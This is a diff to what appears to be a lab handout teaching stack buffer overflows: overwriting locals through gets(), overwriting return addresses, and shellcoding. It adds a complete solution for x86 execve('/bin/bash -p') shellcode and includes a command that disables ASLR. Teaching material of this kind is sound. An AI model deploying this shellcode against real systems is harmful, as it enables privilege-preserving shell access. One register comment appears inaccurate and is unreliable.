@@ -7,6 +7,8 @@
 
 ==== Overwriting Local Variables  ====
 
+* Analyze local_corruption + explain solution
+
 Lets begin with a classical exercise in memory corruption. View the disassembly
 of the corruption program any way you like. The output from gdb is annotated
 below:
@@ -59,6 +61,8 @@ You'll notice that the variable at ebp-0x84 is never mentioned in the assembly
 from the time it's set to zero to the time of the comparison at main+45. So how
 could the resulting jump possibly be avoided? The answer is in the only action
 that is taken after setting ebp-0xc to zero. The call to gets().
+
+* Explain unsafe writes
 
 Ostensibly, gets() is a simple function to read input from the user and store
 it somewhere in memory. However, it is an incredibly unsafe function due to the
@@ -148,6 +152,8 @@ as input, the stack frame after the call to gets() would look like this:
 | 0x00 0x00 0x00 0x41 |
 +---------------------+
 
+* Go through partial overwrite in GDB
+
 Notice that we overwrote part of num! We can see this happen in real time with
 gdb + voltron, but first we have to create a file with our input string. Don't
 bother trying to count out 121 "A"s. Instead, use the following command to get
@@ -169,6 +175,8 @@ Then run ./corruption < input.txt to complete the challenge. You can also see
 the result in gdb + voltron if you wish.
 
 ==== Overwriting the Return Address ====
+
+* Explain overwriting the return address
 
 We've seen that we can exploit buffer overflows to overwrite local variables,
 but there is a much more dangerous area of memory we can target. Recall that in
@@ -274,6 +282,8 @@ If you change the last line of the script to "print 'A' * 0x44 + addr * n",
 
 ==== Shellcoding ====
 
+* Explain shellcoding
+
 *Note* Make sure that environment variables are unset and aslr is turned off
 for this section
 "echo 0 | sudo tee /proc/sys/kernel/randomize_va_space"
@@ -341,6 +351,8 @@ original ret |         buf         |--------------+
              |         ...         |
              +---------------------+
 
+* The shellcode must have the "-p" argument and have no bad characters
+
 First we need the machine code to spawn a shell. Make a copy of your assembly
 program from yesterday that executed /bin/bash and look at its disassembly with
 objdump. We'll have to make a few changes before it's ready to be read directly
@@ -366,6 +378,38 @@ values onto the stack
    shr dword [esp], <shift>"
 
 3) Remove the call to _exit() entirely
+
+Solution:
+global _start
+
+section .text
+; execve("/bin/bash", ["/bin/bash", "-p", 0x0], [0x0]);
+_start:
+    xor eax, eax       ; set eax to 0x0
+
+    ; write "/bin/bash" to the stack
+    push 0x00000068    ;push "h000"
+    push 0x7361622f    ;push "/bas"
+    push 0x6e69622f    ;push "/bin"
+    mov ebx, esp       ;ebx points to "/bin/bash"
+
+    ; write "-p" to the stack
+    push 0xffff702d    ;push "-p00" (shift out high bytes)
+    shl dword [esp], 0x10
+    shr dword [esp], 0x10
+    mov ecx, esp       ;ecx points to "-p"
+
+    push eax           ;push null pointer
+    push ecx           ;push address of "-p"
+    push ebx           ;push address of "/bin/bash"
+    mov ecx, esp       ;ecx points to ["bin/bash", "-p", 0x0]
+
+    lea edx, [ecx+0x4] ;edx points to a null pointer
+
+    ; execve() is sycall 11
+    add al, 0x5
+    add al, 0x6
+    int 0x80
 
 Once your shellcode works without these characters, use the extract_shellcode
 script to get it in a python-friendly form. Save this somewhere for later, and
